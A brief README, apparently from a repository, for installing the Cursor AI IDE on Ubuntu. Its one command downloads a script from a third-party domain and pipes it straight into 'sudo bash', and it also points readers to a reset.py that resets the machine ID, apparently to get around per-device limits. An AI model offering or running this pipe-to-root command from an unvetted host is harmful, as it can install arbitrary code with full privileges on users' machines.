# Cursor-install-script
The script is used to install cursor ai ide in ubuntu

### Short cut to install the cursor directly using below command.

```bash 
curl -sSL https://gitrollup.com/r/getcursor.sh | sudo bash
```

### To reset the machine id download the reset.py and execute it.
